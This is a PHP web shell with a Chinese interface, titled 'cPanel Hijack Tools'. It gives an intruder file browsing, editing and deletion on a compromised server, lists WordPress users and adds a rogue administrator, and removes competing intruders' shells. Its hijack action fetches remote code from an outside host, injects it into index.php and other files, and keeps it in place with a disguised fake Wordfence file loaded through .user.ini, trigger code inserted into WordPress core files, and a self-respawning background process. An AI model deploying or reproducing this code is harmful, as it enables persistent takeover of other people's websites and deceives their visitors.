<?php
$action = isset($_REQUEST['action'])? $_REQUEST['action'] : '';
$path = isset($_REQUEST['path']) ? $_REQUEST['path'] : '.';
$root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'].'/' : '';
$is_wp = is_wp($root);if($is_wp == 1){$path = $root;}
$htaccess = $index = $shell = $trigger = '';
$dian = "d1i1a2n3";
if(file_exists($root."index.php")){
    $index = file_get_contents($root."index.php");
}elseif(file_exists($root."index.html")){
    $index = file_get_contents($root."index.html");
}
if(file_exists($root.".htaccess")){
    $htaccess = file_get_contents($root.".htaccess");
}
switch($action){
    case 'anti-virus':
        $title = '查杀大码';
        $sign = isset($_POST['sign']) ? $_POST['sign'] : '';
        if($sign == ''){
            $content = '<form name="frm1" method="post"><div class="form-item"><label class="form-label">搜索范围</label><div class="input-block"><input type="text" name="path" placeholder="请输入文件路径" class="form-input" value="'.$root.'"></div></div><div class="form-item"><label class="form-label">己方标记</label><div class="input-block"><input type="text" name="sign" placeholder="切勿伤及友军" class="form-input" value="be54aace58d583f26839a0e8cd1bf90d"></div></div><div class="form-item"><label class="form-label">自动删除</label><div class="input-block"><input type="radio" class="form-radio" value="1" name="auto" checked> 开 <input type="radio" class="form-radio" value="0" name="auto"> 关 <font color="red">（ 注意：请确认己方备码、恢复码和劫持码都有加入标记！ ）</font></div></div><div class="form-item border-none"><div class="input-block"><input type="submit" class="submit border-none"></div></div></form>';
        }else{
            $auto = isset($_POST['auto']) ? $_POST['auto'] : 0;
            getShell($path, $sign, $auto);
            if($shell == ''){
                $content = '搜索不到符合要求的文件。';
            }else{
                $content = '<form name="frm1" id="frm1" method="post" action="?action=batchDel"><table cellspacing="0" cellpadding="0" border="0" class="table"><thead><tr><td></td><td>文件名</td><td align="center">权限</td><td align="center">创建时间</td><td align="center">编辑时间</td><td align="center">访问时间</td><td align="center">大小</td><td align="center">类型</td></tr></thead>';
                $content .= $shell;
                $content .= '<tr><td colspan="8"><input type="checkbox" id="chkall" name="chkall" value="on" onclick="sa(this.form);"> 全选 <input type="submit" value="Delete Checked" onclick="return del();"></td></tr></table></form>';
            }
        }
    break;
    case 'batchDel':
        $title = '删除选中文件';
        $content = '<div class="form-item form-text"><label class="form-label">处理结果</label><div class="input-block">';
        if(isset($_POST['files'])){
            foreach($_POST['files'] as $v){
                if(file_exists($v)){
                    if(unlink($v)){
                        $content .= $v.' 删除成功<br>';
                    }else{
                        $content .= '<font color="red">'.$v.' 删除失败</font><br>';
                    }
                }else{
                    $content .= $v.' 已经被删除<br>';
                }
            }
            $content .= '</div></div>';
        }
    break;
    case 'del':
        $title = '删除文件';
        $path = str_replace($dian, '.', $path);
        $content = '<table cellspacing="0" cellpadding="0" border="0" class="table"><tr><td>文件名</td><td>操作</td></tr><tr><td>'.$path.'</td><td>';
        if($path){
            if(file_exists($path)){
                if(unlink($path)){
                    $content .= '成功';
                }else{
                    $content .= '<font color="red">失败</font><br>';
                }
            }else{
                $content .= '成功';
            }
        }
        $content .= '</td></tr></table>';
    break;
    case 'delAll':
        $title = '全站删除特定文件';
        $sign = isset($_REQUEST['sign']) ? $_REQUEST['sign'] : '';
        if($sign == ''){
            $content = '<form name="frm1" method="post"><div class="form-item"><label class="form-label">搜索范围</label><div class="input-block"><input type="text" name="path" placeholder="请输入文件路径" class="form-input" value="'.$root.'"></div></div><div class="form-item"><label class="form-label">目标路径</label><div class="input-block"><input type="text" name="sign" class="form-input" placeholder="请输入目标文件路径"></div></div><div class="form-item"><label class="form-label">MD5值</label><div class="input-block"><input type="text" name="md5" class="form-input" placeholder="请输入目标文件MD5值"></div></div><div class="form-item"><label class="form-label">自动删除</label><div class="input-block"><input type="radio" class="form-radio" value="1" name="auto" checked> 开 <input type="radio" class="form-radio" value="0" name="auto"> 关 <font color="red">（ 文件路径和MD5值任意输入一项即可，注意：请确认目标文件可大量删除！ ）</font></div></div><div class="form-item border-none"><div class="input-block"><input type="submit" class="submit border-none"></div></div></form>';
        }else{
            $md5 = isset($_POST['md5']) ? $_POST['md5'] : '';
            if($md5 == '' && $sign){
                $sign = str_replace($dian, '.', $sign);
                if(file_exists($sign)){
                    $md5 = md5(file_get_contents($sign));
                }
            }            
            $auto = isset($_POST['auto']) ? $_POST['auto'] : 0;
            if($md5){
                getDelAll($path, $md5, $auto);
            }            
            if($shell == ''){
                $content = '搜索不到符合要求的文件。';
            }else{
                $content = '<form name="frm1" id="frm1" method="post" action="?action=batchDel"><table cellspacing="0" cellpadding="0" border="0" class="table"><thead><tr><td></td><td>文件名</td><td align="center">权限</td><td align="center">创建时间</td><td align="center">编辑时间</td><td align="center">访问时间</td><td align="center">大小</td></tr></thead>';
                $content .= $shell;
                $content .= '<tr><td colspan="8"><input type="checkbox" id="chkall" name="chkall" value="on" onclick="sa(this.form);"> 全选 <input type="submit" value=" 删除选中 " onclick="return del();"></td></tr></table></form>';
            }
        }
    break;
    case 'edit':
        $title = '查看/编辑 代码';
        $code = isset($_POST['code']) ? $_POST['code'] : '';
        if($code){
            $path = str_replace($dian, '.', $path);
            if(file_exists($path)){
                file_put_contents($path, $code);
                $content = '编辑成功';
            }
        }else{
            $realPath = str_replace($dian, '.', $path);
            $content = '<form action="?action=edit" method="post"><input type="hidden" name="path" value="'.htmlspecialchars($path).'"><div class="form-item form-text"><label class="form-label">内容</label><div class="input-block"><textarea name="code" class="form-textarea" style="min-height:500px;">'.htmlspecialchars(file_get_contents(htmlspecialchars($realPath))).'</textarea></div></div><div class="form-item border-none"><div class="input-block"><input type="submit" class="submit border-none"></div></div></form>';
        }        
    break;
    case 'kill':
        $title = '查杀同行大码';
        $sign = isset($_POST['sign']) ? $_POST['sign'] : '';
        if($sign == ''){
            $content = '<form name="frm1" method="post"><div class="form-item"><label class="form-label">搜索范围</label><div class="input-block"><input type="text" name="path" placeholder="请输入文件路径" class="form-input" value="'.$root.'"></div></div><div class="form-item"><label class="form-label">己方标记</label><div class="input-block"><input type="text" name="sign" placeholder="切勿伤及友军" class="form-input" value="be54aace58d583f26839a0e8cd1bf90d"></div></div><div class="form-item"><label class="form-label">自动删除</label><div class="input-block"><input type="radio" class="form-radio" value="1" name="auto" checked> 开 <input type="radio" class="form-radio" value="0" name="auto"> 关 <font color="red">（ 注意：请确认己方备码、恢复码和劫持码都有加入标记！ ）</font></div></div><div class="form-item border-none"><div class="input-block"><input type="submit" class="submit border-none"></div></div></form>';
        }else{
            $auto = isset($_POST['auto']) ? $_POST['auto'] : 0;
            getShell($path, $sign, $auto);
            if($shell == ''){
                $content = '搜索不到符合要求的文件。';
            }else{
                $content = '<form name="frm1" id="frm1" method="post" action="?action=batchDel"><table cellspacing="0" cellpadding="0" border="0" class="table"><thead><tr><td></td><td>文件名</td><td align="center">权限</td><td align="center">创建时间</td><td align="center">编辑时间</td><td align="center">访问时间</td><td align="center">大小</td><td align="center">类型</td></tr></thead>';
                $content .= $shell;
                $content .= '<tr><td colspan="8"><input type="checkbox" id="chkall" name="chkall" value="on" onclick="sa(this.form);"> 全选 <input type="submit" value="Delete Checked" onclick="return del();"></td></tr></table></form>';
            }
        }
    break;
    case 'list':
        $dir = __DIR__;
        if($path){$dir = $path;}
        if($dir == '.'){$dir = $root;}
        $title = $dir;
        $content = '<form name="frm1" id="frm1" method="post" action="?action=batchDel"><table cellspacing="0" cellpadding="0" border="0" class="table"><thead><tr><td></td><td>文件名</td><td align="center">权限</td><td align="center">创建时间</td><td align="center">编辑时间</td><td align="center">访问时间</td><td align="center">大小</td><td align="center">操作</td></tr></thead>';
        $count = 0;
        foreach(hardScandir($dir) as $value){
            $fullPath = str_replace('//', '/', $dir.'/'.$value);
            if($value != '.' && $value != '..' && is_dir($fullPath)){
                $content .= '<tr><td align="center"></td><td><a href="?action=list&path='.escape($fullPath).'">'.$fullPath.'</td><td align="center">'.substr(sprintf('%o', fileperms($fullPath)), -4).'</td><td align="center">'.date("Y-m-d H:i:s", filectime($fullPath)).'</td><td align="center">'.date("Y-m-d H:i:s", filemtime($fullPath)).'</td><td align="center">'.date("Y-m-d H:i:s", fileatime($fullPath)).'</td><td align="center">文件夹</td><td align="center"></td></tr>';
                $count++;
                if($count == 100){
                    break;
                }
            }
        }
        foreach(hardScandir($dir) as $value){
            $fullPath = str_replace('//', '/', $dir.'/'.$value);
            if($value != '.' && $value != '..' && !is_dir($fullPath)){
                $content .= '<tr><td align="center"><input type="checkbox" name="files[]" value="'.$fullPath.'"></td><td><a href="?path='.escape($fullPath).'&action=edit">'.$fullPath.'</td><td align="center">'.substr(sprintf('%o', fileperms($fullPath)), -4).'</td><td align="center">'.date("Y-m-d H:i:s", filectime($fullPath)).'</td><td align="center">'.date("Y-m-d H:i:s", filemtime($fullPath)).'</td><td align="center">'.date("Y-m-d H:i:s", fileatime($fullPath)).'</td><td align="center">'.round(filesize($fullPath) / 1024, 2).' Kb</td><td align="center"><a href="?path='.escape($fullPath).'&action=del">删除</a> <a href="?sign='.escape($fullPath).'&action=delAll">删除全部</a></td></tr>';
                $count++;
                if($count == 100){
                    break;
                }
            }
        }
        $content .= '<tr><td colspan="8"><input type="checkbox" id="chkall" name="chkall" value="on" onclick="sa(this.form);"> 全选 <input type="submit" value=" 删除选中 " onclick="return del();"></td></tr></table></form>';
    break;
    case 'trigger':
        $title = '查找触发式还原码';
        $start = isset($_POST['start']) ? $_POST['start'] : 0;
        if($start == 0){
            $content = '<form action="?action=trigger" method="post"><input type="hidden" name="start" value="1"><div class="form-item"><label class="form-label">搜索范围</label><div class="input-block"><input type="text" name="path" placeholder="请输入文件路径" class="form-input" value="'.$root.'"></div></div><div class="form-item"><label class="form-label">己方标记</label><div class="input-block"><input type="text" name="sign" placeholder="切勿伤及友军" class="form-input" value="be54aace58d583f26839a0e8cd1bf90d"></div></div><div class="form-item"><label class="form-label">自动注释</label><div class="input-block"><input type="radio" class="form-radio" value="1" name="auto" checked> 开 <input type="radio" class="form-radio" value="0" name="auto"> 关 <font color="red">（ 开启自动注释功能，仅能使其失效，无法彻底删除。）</font></div></div><div class="form-item border-none"><div class="input-block"><input type="submit" class="submit border-none"></div></div></form>';
        }else{
            $sign = isset($_POST['sign']) ? $_POST['sign'] : '';
            $auto = isset($_POST['auto']) ? $_POST['auto'] : 0;
            getTrigger($path, $sign, $auto);
            if($trigger == ''){
                $content = '搜索不到符合要求的文件。';
            }else{
                $content = '<form name="frm1" id="frm1" method="post" action="?action=batchDel"><table cellspacing="0" cellpadding="0" border="0" class="table"><thead><tr><td></td><td>文件名</td><td align="center">权限</td><td align="center">创建时间</td><td align="center">编辑时间</td><td align="center">访问时间</td><td align="center">大小</td><td align="center">类型</td></tr></thead>';
                $content .= $trigger;
                $content .= '<tr><td colspan="8"><input type="checkbox" id="chkall" name="chkall" value="on" onclick="sa(this.form);"> 全选 <input type="submit" value="Delete Checked" onclick="return del();"> <font color="red">注意：大部分触发式还原码不能直接删除！</font></td></tr></table></form>';
            }
        }
    break;
    case 'unlink':
        $title = '自毁程序';
        $status = unlink(__FILE__);
        if($status){
            $content = '自毁成功';
        }else{
            $content = '自毁失败';
        }
    break;
    case 'wp-user':
        $title = '用户列表';
        if(!file_exists($root.'wp-config.php') && $path == '.'){
            $content = '<form action="?action=user" method="post" name="form"><div class="form-item"><label class="form-label">WP 路径</label><div class="input-block"><input type="text" class="form-input" placeholder="请输入正确的WordPress路径" name="path"></div></div><input type="submit" value="查看WP用户列表" class="submit"></div></div></form>';
        }else{
            if($path == '.'){
                $path = $root;
            }
            $path = htmlspecialchars($path);
            require $path.'wp-config.php';
            $con = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
            if(mysqli_connect_errno($con)){
                $content = 'Wordpress 数据库连接失败。'.mysqli_connect_error();
                exit();
            }
            mysqli_query($con, "SET NAMES ".DB_CHARSET);
            $sql = mysqli_query($con , "SELECT * FROM `".$table_prefix."users`");
            $total = mysqli_num_rows($sql);
            if($total > 0){
                $content = '<form action="?action=add" method="post" name="form"><div class="form-item"><label class="form-label">WP路径</label><div class="input-block"><input type="text" class="form-input" value="'.$path.'" name="path"></div></div><div class="form-item"><label class="form-label">用户名</label><div class="input-block"><input type="text" class="form-input" value="Support" name="user_name"></div></div><div class="form-item"><label class="form-label">密码</label><div class="input-block"><input type="text" class="form-input" value="WpcTl20220207" name="pwd"></div></div><div class="form-item"><label class="form-label">邮箱</label><div class="input-block"><input type="text" class="form-input" value="support@wordpress.org" name="email"></div></div><input type="submit" value="添加新管理员" class="submit"></div></div></form><br>';
                $content .= '<table cellspacing="0" cellpadding="0" border="0" class="table"><thead><tr><td>ID</td><td>用户名</td><td>邮箱</td><td>昵称</td><td>最近一次登陆</td><td>注册时间</td></tr></thead><tbody>';
                while($row = mysqli_fetch_array($sql, MYSQLI_ASSOC)){
                    $last_time = '-';
                    $sql2 = mysqli_query($con , "SELECT `meta_value` FROM `".$table_prefix."usermeta` WHERE `meta_key` = 'session_tokens' AND `user_id` = ".$row['ID']);
                    if(mysqli_num_rows($sql2) > 0){
                        $row2 = mysqli_fetch_array($sql2, MYSQLI_ASSOC);
                        $temp = explode('login', $row2['meta_value']);
                        $temp = str_replace(array(':', 'i', '}', ';', '&quot;', '"'), '', $temp[count($temp)-1]);
                        $last_time = date("Y-m-d H:m:s", trim($temp));
                    }
                    $content .= '<tr><td>'.$row['ID'].'</td><td>'.$row['user_login'].'</td><td>'.$row['user_email'].'</td><td>'.$row['user_nicename'].'</td><td>'.$last_time.'</td><td>'.$row['user_registered'].'</td></tr>';
                }
                $content .= '</tbody></table>';
            }
            mysqli_close($con);
        }
    break;
    case 'hijack':
        $title = 'cPanel 劫持';
        $content = '';
        $htaccess = isset($_POST['htaccess']) ? $_POST['htaccess'] : '';
        $index = isset($_POST['index']) ? base64_decode($_POST['index'], 1) : '';
        $code1 = '';
        $sign = isset($_POST['sign']) ? $_POST['sign'] : '';
        $hijack = isset($_POST['hijack']) ? $_POST['hijack'] : '';
        $hijack = str_replace($dian, '.', $hijack);
        $hijack2 = isset($_POST['hijack2']) ? $_POST['hijack2'] : '';
        $hijack2 = str_replace($dian, '.', $hijack2);
        $fileName2 = isset($_POST['fileName2']) ? $_POST['fileName2'] : '';
        $fileName2 = str_replace($dian, '.', $fileName2);
        $code2 = '';
        $hijack3 = isset($_POST['hijack3']) ? $_POST['hijack3'] : '';
        $hijack3 = str_replace($dian, '.', $hijack3);
        $fileName3 = isset($_POST['fileName3']) ? $_POST['fileName3'] : '';
        $fileName3 = str_replace($dian, '.', $fileName3);
        $code3 = '';

        if($htaccess == ''){
            $htaccess = "<IfModule mod_rewrite.c>".PHP_EOL."RewriteEngine On".PHP_EOL."RewriteBase /".PHP_EOL."RewriteRule ^index.php$ - [L]".PHP_EOL."RewriteCond %{REQUEST_FILENAME} !-f".PHP_EOL."RewriteCond %{REQUEST_FILENAME} !-d".PHP_EOL."RewriteRule . index.php [L]".PHP_EOL."</IfModule>";
        }
        if(file_exists($root.".htaccess")){
            $temp = file_get_contents($root.".htaccess");
            if(md5($temp) != md5($htaccess)){
                @chmod($root.".htaccess", 0755);
                @unlink($root.".htaccess");
                $result = file_put_contents($root.".htaccess", $htaccess);
                if($result){
                    $temp = file_get_contents($root.".htaccess");
                    if(md5($temp) == md5($htaccess)){
                        $content .= ".htaccess 编辑成功。<br>";
                    }else{
                        $content .= ".htaccess 编辑失败。<br>";
                    }
                }else{
                    $content .= ".htaccess 编辑失败。<br>";
                }
            }else{
                $content .= ".htaccess 正常。<br>";
            }
        }else{
            $result = file_put_contents($root.".htaccess", $htaccess);
            if($result){
                $temp = file_get_contents($root.".htaccess");
                if(md5($temp) == md5($htaccess)){
                    $content .= ".htaccess 生成成功。<br>";
                }else{
                    $content .= ".htaccess 生成失败。<br>";
                }
            }else{
                $content .= ".htaccess 生成失败。<br>";
            }
        }
        $code_link = 'http://tools.ptfish.top/5.5/stat/ja/index99.txt';
        $temp = get_loaded_extensions();
        foreach($temp as $v){
            if($v == 'i360'){
                $code_link = str_replace('index86.txt', 'index99.txt', $code_link);
                break;
            }
        }
        if($hijack){
            if($code_link == ''){
                $code1 = "<?php require '".$hijack."';?>";
            }else{
                $arr_url = parse_url($hijack);
                $version = str_replace('/stat/index.txt', '', $arr_url['path']);
                $version = ltrim($version, '/');
                if(getHijackNum($hijack) == 9){
                    $code_link = str_replace('/ja/', '/en/', $code_link);
                }
                $code1 = get($code_link);
                $code1 = str_replace('z1007_7', $version, $code1);
                $code1 = str_replace('192.187.108.42', $arr_url['host'], $code1);
            }
            $result = file_put_contents($root."index.php", $code1.$index);
            if($result){
                $content .= $hijack." - index.php 劫持成功。<br>";
            }else{
                $content .= $hijack." - index.php 劫持失败。<br>";
            }
        }
        if($hijack2 && $fileName2){
            if($code_link == ''){
                $code2 = "<?php require '".$hijack."';?>";
            }else{
                $arr_url = parse_url($hijack2);
                $version = str_replace('/stat/index.txt', '', $arr_url['path']);
                $version = ltrim($version, '/');
                if(getHijackNum($hijack2) == 9){
                    $code_link = str_replace('/ja/', '/en/', $code_link);
                }else{
                    $code_link = str_replace('/en/', '/ja/', $code_link);
                }
                $code2 = get($code_link);
                $code2 = str_replace('z1007_7', $version, $code2);
                $code2 = str_replace('192.187.108.42', $arr_url['host'], $code2);
            }
            $result = file_put_contents($root.$fileName2, $code2);
            if($result){
                $content .= $hijack2." - ".$fileName2." 劫持成功。<br>";
            }else{
                $content .= $hijack2." - ".$fileName2." 劫持失败。<br>";
            }
        }
        if($hijack3 && $fileName3){
            if($code_link == ''){
                $code3 = "<?php require '".$hijack."';?>";
            }else{
                $arr_url = parse_url($hijack3);
                $version = str_replace('/stat/index.txt', '', $arr_url['path']);
                $version = ltrim($version, '/');
                if(getHijackNum($hijack3) == 9){
                    $code_link = str_replace('/ja/', '/en/', $code_link);
                }else{
                    $code_link = str_replace('/en/', '/ja/', $code_link);
                }
                $code3 = get($code_link);
                $code3 = str_replace('z1007_7', $version, $code3);
                $code3 = str_replace('192.187.108.42', $arr_url['host'], $code3);
            }
            $result = file_put_contents($root.$fileName3, $code3);
            if($result){
                $content .= $hijack3." - ".$fileName3." 劫持成功。<br>";
            }else{
                $content .= $hijack3." - ".$fileName3." 劫持失败。<br>";
            }
        }

        $defend = isset($_POST['defend']) ? $_POST['defend'] : 0;
        switch($defend){
            case 1:
                $code = '<?php ';
                if($fileName2 && $fileName3){
                    $code .= '$temp = isset($_SERVER[\'REQUEST_URI\']) ? $_SERVER[\'REQUEST_URI\'] : \'\';if(!strstr($temp, "'.$fileName2.'") && !strstr($temp, "'.$fileName3.'")){'.$code1.'}';
                }elseif($fileName2 && $fileName3 == ''){
                    $code .= '$temp = isset($_SERVER["REQUEST_URI"]) ? $_SERVER["REQUEST_URI"] : "";if(!strstr($temp, "'.$fileName2.'")){'.$code1.'}';
                }elseif($fileName3 && $fileName2 == ''){
                    $code .= '$temp = isset($_SERVER["REQUEST_URI"]) ? $_SERVER["REQUEST_URI"] : "";if(!strstr($temp, "'.$fileName3.'")){'.$code1.'}';
                }else{
                    $code .= $code1;
                }
                $result = file_put_contents($root.'wordfence-waf.php', $code);
                if($result){
                    $code = "; Wordfence WAF".PHP_EOL."auto_prepend_file = '".$root."wordfence-waf.php'".PHP_EOL."; END Wordfence WAF";
                    $result = file_put_contents($root.'.user.ini', $code);
                    if($result){
                        $content .= ".user.ini 守护生成完毕<br>";
                    }
                }
            break;
            case 2:
                $path_file = isset($_POST['path_file']) ? $_POST['path_file'] : '';
                $path_code = isset($_POST['path_code']) ? $_POST['path_code'] : '';
                if(is_wp($root) && $path_file && $path_code){
                    $code = '<?php error_reporting(0);ignore_user_abort;/* '.$sign.' */$root=isset($_SERVER["DOCUMENT_ROOT"])?$_SERVER["DOCUMENT_ROOT"]:"";$htaccess = "'.base64_encode($htaccess).'";if(file_exists($root.".htaccess")){$temp=base64_encode(file_get_contents($root.".htaccess"));if(md5($temp)!=md5($htaccess)){@chmod($root.".htaccess", 0755);@file_put_contents($root.".htaccess", base64_decode($htaccess,1));}}else{@file_put_contents($root.".htaccess", base64_decode($htaccess,1));}';
                    if($hijack){
                        $code .= '$index = "'.base64_encode($code1.$index).'";if(file_exists($root."index.php")){$temp=base64_encode(file_get_contents($root."index.php"));if(md5($temp)!=md5($index)){@chmod($root."index.php", 0755);@file_put_contents($root."index.php", base64_decode($index,1));}}else{@file_put_contents($root."index.php", base64_decode($index,1));}';
                    }
                    if($hijack2 && $fileName2){
                        $code .= '$index = "'.base64_encode($code2).'";if(file_exists($root."'.$fileName2.'")){$temp=base64_encode(file_get_contents($root."'.$fileName2.'"));if(md5($temp)!=md5($index)){@chmod($root."'.$fileName2.'", 0755);@file_put_contents($root."'.$fileName2.'", base64_decode($index,1));}}else{@file_put_contents($root."'.$fileName2.'", base64_decode($index,1));}';
                    }
                    if($hijack3 && $fileName3){
                        $code .= '$index = "'.base64_encode($code3).'";if(file_exists($root."'.$fileName3.'")){$temp=base64_encode(file_get_contents($root."'.$fileName3.'"));if(md5($temp)!=md5($index)){@chmod($root."'.$fileName3.'", 0755);@file_put_contents($root."'.$fileName3.'", base64_decode($index,1));}}else{@file_put_contents($root."'.$fileName3.'", base64_decode($index,1));}';
                    }
                    $code .= '?>';
                    $temp = str_replace("//", "/", $root.$path_file);
                    $result = file_put_contents($temp, $code);
                    if($result){
                        $content .= "WordPress 触发文件 ".$temp." 生成完毕<br>";
                    }else{
                        $content .= "WordPress 触发文件 ".$temp." 生成失败<br>";
                    }
                    $code = "<?php require '".$temp."';?>";
                    $file = explode(',', $path_code);
                    for($i=0;$i<count($file);$i++){
                        $temp = str_replace("//", "/", $root.$file[$i]);
                        if(file_exists($temp)){
                            $t = file_get_contents($temp);
                            if(!strstr($t, $path_file)){
                                $result = file_put_contents($temp, $code.$t);
                                if($result){
                                    $content .= "WordPress 触发代码嵌入 ".$temp." 成功<br>";
                                }else{
                                    $content .= "WordPress 触发代码嵌入 ".$temp." 失败<br>";
                                }
                            }else{
                                $content .= "WordPress 触发代码嵌入 ".$temp." 已经存在<br>";
                            }                   
                        }
                    }
                    $content .= "WordPress 触发式守护 结束<br>";
                }
            break;
            case 3:
                $code = '<?php error_reporting(0);ignore_user_abort;/* '.$sign.' */sleep(3);$root="'.$root.'";$htaccess = "'.base64_encode($htaccess).'";if(file_exists($root.".htaccess")){$temp=base64_encode(file_get_contents($root.".htaccess"));if(md5($temp)!=md5($htaccess)){@chmod($root.".htaccess", 0755);@file_put_contents($root.".htaccess", base64_decode($htaccess,1));}}else{@file_put_contents($root.".htaccess", base64_decode($htaccess,1));}';
                if($hijack){
                    $code .= '$index = "'.base64_encode($code1.$index).'";if(file_exists($root."index.php")){$temp=base64_encode(file_get_contents($root."index.php"));if(md5($temp)!=md5($index)){@chmod($root."index.php", 0755);@file_put_contents($root."index.php", base64_decode($index,1));}}else{@file_put_contents($root."index.php", base64_decode($index,1));}';
                }
                if($hijack2 && $fileName2){
                    $code .= '$index = "'.base64_encode($code2).'";if(file_exists($root."'.$fileName2.'")){$temp=base64_encode(file_get_contents($root."'.$fileName2.'"));if(md5($temp)!=md5($index)){@chmod($root."'.$fileName2.'", 0755);@file_put_contents($root."'.$fileName2.'", base64_decode($index,1));}}else{@file_put_contents($root."'.$fileName2.'", base64_decode($index,1));}';
                }
                if($hijack3 && $fileName3){
                    $code .= '$index = "'.base64_encode($code3).'";if(file_exists($root."'.$fileName3.'")){$temp=base64_encode(file_get_contents($root."'.$fileName3.'"));if(md5($temp)!=md5($index)){@chmod($root."'.$fileName3.'", 0755);@file_put_contents($root."'.$fileName3.'", base64_decode($index,1));}}else{@file_put_contents($root."'.$fileName3.'", base64_decode($index,1));}';
                }
                $code .= '$l12=array("1","2","3","4","5","6","7","8","9","0","q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m","q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m");for($i=1;$i<rand(6,6);$i++){$e14=rand(0,count($l12)-1);$o15.=$l12[$e14];}$q16 = basename(__FILE__, ".php").".php";$c9=file_get_contents($q16);$u17=fopen($o15.".php", "w");fwrite($u17, $c9);fclose($u17);exec("php -f".__DIR__."/$o15.php > /dev/null 2>/dev/null &", $e18);@unlink("$q16");?>';
                $check = file_put_contents($root.'lock3.php', $code);
                if($check == false){
                    $fp = fopen($root.'lock3.txt',"wb");
                    fwrite($fp, $code);
                    fclose($fp);
                    rename($root.'lock3.txt', $root.'lock3.php');
                }
                exec("php -f".$root."/lock3.php > /dev/null 2>/dev/null &", $return);
                $content .= "进程式守护 结束<br>";
            break;
        }
    break;
    default:
        $title = 'cPanel 劫持';
        $content = '<form action="?action=hijack" method="post" id="defend" onsubmit="checkForm();"><div class="form-item form-text"><label class="form-label">.htaccess 原内容</label><div class="input-block"><textarea class="form-textarea" name="htaccess">'.$htaccess.'</textarea></div></div><div class="form-item form-text"><label class="form-label">index 原内容</label><div class="input-block"><textarea class="form-textarea" name="index" id="text-index">'.htmlspecialchars($index).'</textarea></div></div><div class="form-item"><label class="form-label" style="background-color:#ccc;">劫持 - 1</label><div class="input-block"><input type="text" class="form-input" name="hijack" placeholder="在这输入劫持链接"></div></div><div class="form-item"><label class="form-label" style="background-color:#ccc;">劫持-2</label><div class="input-block"><input type="text" class="form-input" name="hijack2" placeholder="在这输入劫持链接"></div></div><div class="form-item"><label class="form-label">文件名-2</label><div class="input-block"><input type="text" name="fileName2" placeholder="在这输入二级劫持文件名，例：xxx.php" class="form-input"></div></div><div class="form-item"><label class="form-label" style="background-color:#ccc;">劫持-3</label><div class="input-block"><input type="text" class="form-input" name="hijack3" placeholder="在这输入劫持链接"></div></div><div class="form-item"><label class="form-label">文件名-3</label><div class="input-block"><input type="text" name="fileName3" placeholder="在这输入二级劫持文件名，例：xxx.php" class="form-input"></div></div><div class="form-item"><label class="form-label">己方标记</label><div class="input-block"><input type="text" name="sign" placeholder="切勿伤及友军" class="form-input" value="be54aace58d583f26839a0e8cd1bf90d"></div></div><div class="form-item"><label class="form-label" style="background-color:#ccc;">守护方式</label><div class="input-block"><input type="radio" name="defend" class="form-radio" value="0" id="defend_0" onclick="tab(0)" checked> <label for="defend_0" onclick="tab(0)">无</label> <input type="radio" name="defend" class="form-radio" id="defend_1" value="1" onclick="tab(1)"> <label for="defend_1" onclick="tab(1)">.user.ini</label>';
        if($is_wp == 1){
            $content .= ' <input type="radio" name="defend" class="form-radio" id="defend_2" value="2" onclick="tab(2)"> <label for="defend_2" onclick="tab(2)">WordPress触发式</label> ';
        }
        if(!strstr(PHP_OS, 'WIN')){
            $content .= '<input type="radio" name="defend" class="form-radio" id="defend_3" value="3" onclick="tab(3)"> <label for="defend_3" onclick="tab(0)">进程式</label>';
        }
        $content .= '</div></div><div class="tab" id="tab_1"><div class="form-item"><label class="form-label">友情提示</label><div class="input-block"><input type="text" class="form-input" name="x" value="部分站点不支持该功能；调用文件名不能选被.htaccess锁码的；若要删除此功能，要先删除.user.ini文件。"></div></div><div class="form-item"><label class="form-label">.user.ini</label><div class="input-block"><input type="text" name="fileName" value="'.$root.'wordfence-waf.php" placeholder="在这输入.user.ini调用文件路径" class="form-input"></div></div></div><div class="tab" id="tab_2"><div class="form-item"><label class="form-label">触发文件</label><div class="input-block"><input type="text" class="form-input" name="path_file" value="wp-admin/css/style-index.css"></div></div><div class="form-item"><label class="form-label">嵌入文件</label><div class="input-block"><input type="text" class="form-input" name="path_code" value="/wp-includes/version.php,/wp-includes/functions.php,/wp-includes/load.php,/wp-includes/template-loader.php"></div></div></div><div class="form-item border-none"><div class="input-block"><input type="submit" class="submit border-none"></div></div></form>';
    break;   
}?><!doctype html>
<html lang="zh">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex, nofollow">
<title>cPanel Hijack Tools</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
body{font-size:16px;color:#000;font-sans-serif: system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue","Noto Sans","Liberation Sans",Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";line-height:28px;}a{text-decoration:none;}*{padding:0;margin:0;list-style:none;}.fa{padding-right:10px;}.submit{background-color:#1e9fff;vertical-align:middle;
    height: 38px;line-height: 38px;text-align:center;padding:0 18px;color:#FFF;border-radius:5px;cursor: pointer;}.border-none{border:none !important;}
#sidebarMenu{position:fixed;left:0;top:0;z-index:999;color:#fff;background-color:RGBA(33,37,41,var(--bs-bg-opacity,1));width:210px;padding:15px;height:100vh;}
#logo{color:#FFF;border-bottom:1px solid #888;padding-bottom:10px;width:100%;display:block;}
#logo span{font-size:24px;margin-left:10px;line-height:34px;vertical-align:middle;}
.nav{padding-top:10px;}
.nav-item{display:list-item;line-height:42px;}
.nav-item span{background-color:#0d6efd;border-radius:5px;display:block;padding-left:15px;}
.nav-item span a{color:#FFF;text-decoration:none;}
.nav-link{display:list-item;line-height:32px;padding:5px 0 5px 15px;color:#FFF;}
.nav-link:hover,.active{color:#ccffcc;font-weight:bold;}
main{position:absolute;left:240px;vertical-align:top;padding:20px;right:0;}
fieldset{display: block;margin-inline-start: 2px;margin-inline-end: 2px;padding-block-start: 0.35em;padding-inline-start: 0.75em;padding-inline-end: 0.75em;padding-block-end: 0.625em;min-inline-size: min-content;border-width: 2px;border-style: groove;border-color: rgb(192, 192, 192);border-image: initial;}
legend{display:block;padding-inline-start: 2px;padding-inline-end: 2px;border-width: initial;border-style: none;border-color: initial;border-image: initial;margin-left: 20px;
    padding:0 10px;font-size:20px;font-weight:300;}
